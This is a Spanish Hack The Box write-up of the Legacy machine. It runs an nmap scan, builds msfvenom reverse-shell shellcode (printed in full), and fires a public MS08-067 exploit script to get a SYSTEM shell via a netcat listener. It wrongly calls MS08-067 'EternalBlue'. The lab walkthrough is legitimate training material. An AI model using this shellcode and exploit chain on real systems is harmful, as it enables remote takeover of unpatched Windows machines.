---
layout: single
title: <span style="color:#e62e2e">Legacy </span><span class="htb"><span class="en_blanco">-</span> Hack The Box <span class="en_blanco">-</span> </span><span class="es_rojo">E</span><span class="es_amarillo">S</span><span class="es_rojo">P</span>
excerpt: "En este post veremos como explotar la máquina Legacy usando el EternalBlue CVE-2008-4250. Tiene parecido a la máquina anterior Blue, pero tocaremos algún otro concepto como la creación
de un shellcode con msfvenom y no usaremos el zzz_exploit.py."
date: 2022-08-11
classes: wide
header:
  teaser: /assets/images/Legacy/Legacy.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hack The Box
  - Easy
  - Esp
tags: 
  - Eternalblue
  - ms08-067
  - Smb
  - CVE-2008-4250
  - msfvenom
---

## DESCRIPCION
 
En este post veremos como explotar la máquina Legacy usando el EternalBlue CVE-2008-4250. Tiene parecido a la máquina anterior Blue, pero tocaremos algún otro concepto como la creación
de un shellcode con msfvenom y no usaremos el zzz_exploit.py.

![](/assets/images/Legacy/Legacy_Descripcion.png)


## INDICE

- [Reconocimiento de puertos](#escaneo-de-puertos)
- [Explotación con EternalBlue](#explotacion-con-eternalblue)
	- [Repositorio de github](#github)
	- [Creación del shellcode con Msfvenom](#shellcode)
	- [Modificación del script](#script)
	- [Obtención de la reverse shell](#revshell)
- [Flags](#flags)
- [Conocimientos obtenidos](#conocimientos-obtenidos)
- [Errores](#errores)
- [Autores y referencias](#autores-y-referencias)

## ESCANEO DE PUERTOS

Escaneamos con `nmap` los puertos abiertos en la máquina Legacy:

```zsh
❯ cat Puertos
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Puertos
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ nmap --open -p- -T5 -oG Puertos 10.10.10.4
   2   │ Host: 10.10.10.4 () Status: Up
   3   │ Host: 10.10.10.4 () Ports: 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ Reconocimiento Puertos

{*} Extrayendo puertos...

	La direccion ip es: 10.10.10.4
	Los puertos abiertos son: 135,139,445

	Los puertos han sido copiados al portapapeles
```
<br>

Escaneamos el objetivo con los scripts predeterminados de nmap apuntando a los puertos abiertos en busca de más información.

```ruby
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Objetivos
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ nmap -sCV -p 135,139,445 -oN Objetivos 10.10.10.4
   2   │ Nmap scan report for 10.10.10.4
   3   │ Host is up (0.045s latency).
   4   │ 
   5   │ PORT    STATE SERVICE      VERSION
   6   │ 135/tcp open  msrpc        Microsoft Windows RPC
   7   │ 139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
   8   │ 445/tcp open  microsoft-ds Windows XP microsoft-ds
   9   │ Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
  10   │ 
  11   │ Host script results:
  12   │ |_smb2-time: Protocol negotiation failed (SMB2)
  13   │ |_clock-skew: mean: 5d00h27m40s, deviation: 2h07m16s, median: 4d22h57m40s
  14   │ |_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:35:28 (VMware)
  15   │ | smb-security-mode: 
  16   │ |   account_used: <blank>
  17   │ |   authentication_level: user
  18   │ |   challenge_response: supported
  19   │ |_  message_signing: disabled (dangerous, but default)
  20   │ | smb-os-discovery: 
  21   │ |   OS: Windows XP (Windows 2000 LAN Manager)
  22   │ |   OS CPE: cpe:/o:microsoft:windows_xp::-
  23   │ |   Computer name: legacy
  24   │ |   NetBIOS computer name: LEGACY\x00
  25   │ |   Workgroup: HTB\x00
  26   │ |_  System time: 2022-07-18T19:51:37+03:00
       │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Vemos que el SO que corre en la máquina es `Windows XP` en este momento ya tenemos que pensar en el famoso `EternalBlue` o en alguna de sus variantes.

Podemos comprobar con nmap si el equipo tiene alguna vulnerabilidad con el siguiente parámetro `--script vuln`, en este caso lo más seguro es que nos reporte vulnerabilidades
para el smb como el EternalBlue.

```ruby
❯ nmap --script vuln -p 135,139,445 10.10.10.4 -oN Vulnschecker
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-11 05:05 CEST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.4
Host is up (0.044s latency).

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143https://www.hackthebox.com/storage/avatars/60dc190c4c015cfe3a3aef9b5afca254.png
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250

```
Vemos que es vulnerable y tenemos dos opciones `smb-vuln-ms17-010 & smb-vuln-ms08-067`. Nos decantaremos por la última, ya que en la máquina <a href="/Blue-Hack-The-Box/" target="_blank">Blue</a> 
usamos la primera.


## EXPLOTACION CON ETERNALBLUE 

<h3 style="text-align:center;" id="github">REPOSITORIO</h3><br>

Tenemos un repositorio de <a href="https://github.com/andyacer/ms08_067" target="_blanck">github</a> donde se nos facilita un script en python para explotar esta vulnerabilidad `CVE-2008-4250`.
<br>
<h3 style="text-align:center;" id="shellcode">CREACION DEL SHELLCODE MSFVENOM</h3><br>

Vamos a generar un shellcode con `msfvenom`.

```ruby
❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=1234 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1488 bytes
unsigned char buf[] = 
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x6f\x88\xb5\xee\x83\xee\xfc\xe2\xf4\x93\x60\x37\xee\x6f\x88"
"\xd5\x67\x8a\xb9\x75\x8a\xe4\xd8\x85\x65\x3d\x84\x3e\xbc\x7b"
"\x03\xc7\xc6\x60\x3f\xff\xc8\x5e\x77\x19\xd2\x0e\xf4\xb7\xc2"
"\x4f\x49\x7a\xe3\x6e\x4f\x57\x1c\x3d\xdf\x3e\xbc\x7f\x03\xff"
"\xd2\xe4\xc4\xa4\x96\x8c\xc0\xb4\x3f\x3e\x03\xec\xce\x6e\x5b"
"\x3e\xa7\x77\x6b\x8f\xa7\xe4\xbc\x3e\xef\xb9\xb9\x4a\x42\xae"
"\x47\xb8\xef\xa8\xb0\x55\x9b\x99\x8b\xc8\x16\x54\xf5\x91\x9b"
"\x8b\xd0\x3e\xb6\x4b\x89\x66\x88\xe4\x84\xfe\x65\x37\x94\xb4"
"\x3d\xe4\x8c\x3e\xef\xbf\x01\xf1\xca\x4b\xd3\xee\x8f\x36\xd2"
"\xe4\x11\x8f\xd7\xea\xb4\xe4\x9a\x5e\x63\x32\xe0\x86\xdc\x6f"
"\x88\xdd\x99\x1c\xba\xea\xba\x07\xc4\xc2\xc8\x68\x77\x60\x56"
"\xff\x89\xb5\xee\x46\x4c\xe1\xbe\x07\xa1\x35\x85\x6f\x77\x60"
"\xbe\x3f\xd8\xe5\xae\x3f\xc8\xe5\x86\x85\x87\x6a\x0e\x90\x5d"
"\x22\x84\x6a\xe0\xbf\xe4\x7f\x8d\xdd\xec\x6f\x8c\x67\x67\x89"
"\xe2\xa5\xb8\x38\xe0\x2c\x4b\x1b\xe9\x4a\x3b\xea\x48\xc1\xe2"
"\x90\xc6\xbd\x9b\x83\xe0\x45\x5b\xcd\xde\x4a\x3b\x07\xeb\xd8"
"\x8a\x6f\x01\x56\xb9\x38\xdf\x84\x18\x05\x9a\xec\xb8\x8d\x75"
"\xd3\x29\x2b\xac\x89\xef\x6e\x05\xf1\xca\x7f\x4e\xb5\xaa\x3b"
"\xd8\xe3\xb8\x39\xce\xe3\xa0\x39\xde\xe6\xb8\x07\xf1\x79\xd1"
"\xe9\x77\x60\x67\x8f\xc6\xe3\xa8\x90\xb8\xdd\xe6\xe8\x95\xd5"
"\x11\xba\x33\x55\xf3\x45\x82\xdd\x48\xfa\x35\x28\x11\xba\xb4"
"\xb3\x92\x65\x08\x4e\x0e\x1a\x8d\x0e\xa9\x7c\xfa\xda\x84\x6f"
"\xdb\x4a\x3b"
```
<br>

<h3 style="text-align:center;" id="script">MODIFICACION DEL SCRIPT</h3><br>

Antes de hacer uso del exploit vamos a modificar el script `ms08_067_2018.py` con el shellcode para definir la reverse shell.

```python
shellcode=(
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x6f\x88\xb5\xee\x83\xee\xfc\xe2\xf4\x93\x60\x37\xee\x6f\x88"
"\xd5\x67\x8a\xb9\x75\x8a\xe4\xd8\x85\x65\x3d\x84\x3e\xbc\x7b"
"\x03\xc7\xc6\x60\x3f\xff\xc8\x5e\x77\x19\xd2\x0e\xf4\xb7\xc2"
"\x4f\x49\x7a\xe3\x6e\x4f\x57\x1c\x3d\xdf\x3e\xbc\x7f\x03\xff"
"\xd2\xe4\xc4\xa4\x96\x8c\xc0\xb4\x3f\x3e\x03\xec\xce\x6e\x5b"
"\x3e\xa7\x77\x6b\x8f\xa7\xe4\xbc\x3e\xef\xb9\xb9\x4a\x42\xae"
"\x47\xb8\xef\xa8\xb0\x55\x9b\x99\x8b\xc8\x16\x54\xf5\x91\x9b"
"\x8b\xd0\x3e\xb6\x4b\x89\x66\x88\xe4\x84\xfe\x65\x37\x94\xb4"
"\x3d\xe4\x8c\x3e\xef\xbf\x01\xf1\xca\x4b\xd3\xee\x8f\x36\xd2"
"\xe4\x11\x8f\xd7\xea\xb4\xe4\x9a\x5e\x63\x32\xe0\x86\xdc\x6f"
"\x88\xdd\x99\x1c\xba\xea\xba\x07\xc4\xc2\xc8\x68\x77\x60\x56"
"\xff\x89\xb5\xee\x46\x4c\xe1\xbe\x07\xa1\x35\x85\x6f\x77\x60"
"\xbe\x3f\xd8\xe5\xae\x3f\xc8\xe5\x86\x85\x87\x6a\x0e\x90\x5d"
"\x22\x84\x6a\xe0\xbf\xe4\x7f\x8d\xdd\xec\x6f\x8c\x67\x67\x89"
"\xe2\xa5\xb8\x38\xe0\x2c\x4b\x1b\xe9\x4a\x3b\xea\x48\xc1\xe2"
"\x90\xc6\xbd\x9b\x83\xe0\x45\x5b\xcd\xde\x4a\x3b\x07\xeb\xd8"
"\x8a\x6f\x01\x56\xb9\x38\xdf\x84\x18\x05\x9a\xec\xb8\x8d\x75"
"\xd3\x29\x2b\xac\x89\xef\x6e\x05\xf1\xca\x7f\x4e\xb5\xaa\x3b"
"\xd8\xe3\xb8\x39\xce\xe3\xa0\x39\xde\xe6\xb8\x07\xf1\x79\xd1"
"\xe9\x77\x60\x67\x8f\xc6\xe3\xa8\x90\xb8\xdd\xe6\xe8\x95\xd5"
"\x11\xba\x33\x55\xf3\x45\x82\xdd\x48\xfa\x35\x28\x11\xba\xb4"
"\xb3\x92\x65\x08\x4e\x0e\x1a\x8d\x0e\xa9\x7c\xfa\xda\x84\x6f"
"\xdb\x4a\x3b"
)
```
<br>
<h3 style="text-align:center;" id="revshell">OBTENCION DE LA REVERSE SHELL</h3><br>

1- Nos ponemos por escucha con nc y usando `rlwrap` para obtener una consola más interactiva.

```zsh
rlwrap nc -lvnp 1234 
```
<br>
2- Comprobamos el uso del script.

```
❯ python ms08_067_2018.py
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################


Usage: ms08_067_2018.py <target ip> <os #> <Port #>

Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)

```
<br>
3- Ejecutamos el script, pasándole los parámetros correspondientes, en este caso el `os=6` y `port=445`.

```ruby
❯ python2 ms08_067_2018.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish

```
<br>

4- Comprobamos la correcta obtención de la reverse shell.

```ruby
❯ rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.4] 1032
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```
5- ¡Somos nt authority\system! Perfecto ya podemos visualizar las flags.

## FLAGS

<h3>User.txt</h3>

```
Directory of C:\Documents and Settings\john\Desktop

16/03/2017  09:19     <DIR>          .
16/03/2017  09:19     <DIR>          ..
16/03/2017  09:19                 32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.342.369.280 bytes free

type user.txt
e69axxxxxxxxxxxxxxxxxxxxxxxxxxxx

```
<h3>Root.txt</h3>

```
Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  09:18     <DIR>          .
16/03/2017  09:18     <DIR>          ..
16/03/2017  09:18                 32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.342.385.664 bytes free

type root.txt
9934xxxxxxxxxxxxxxxxxxxxxxxxxxxx

```
## CONOCIMIENTOS OBTENIDOS

De la máquina <em>Legacy</em> podemos extraer los siguientes conocimientos:

- Reconocimiento de puertos con Nmap.
- Comprobar vulnerabilidades explotables con Nmap.
- Crear un shellcode con msfvenom el cual entable una reverse shell.
- Explotar smb con EternalBlue.


## ERRORES

Un posible error que podéis sufrir es el siguiente: 
 - Al ejecutar el script puede crashear la máquina, por lo que tendrías que reiniciarla y volver a ejecutarlo.

## AUTORES y REFERENCIAS

Autor del write up: Luis Miranda Sierra (Void4m0n) <a href="https://app.hackthebox.com/profile/1104062" target="_blank">HTB</a>. Si queréis contactarme por cualquier motivo lo podéis hacer a través 
de <a href="https://twitter.com/Void4m0n" target="_blank">Twitter</a>.


Autor de la máquina:  <em>ch4p</em>, muchas gracias por la creación de Legacy aportando a la comunidad. <a href="https://app.hackthebox.com/users/1" target="_blank">HTB</a>.
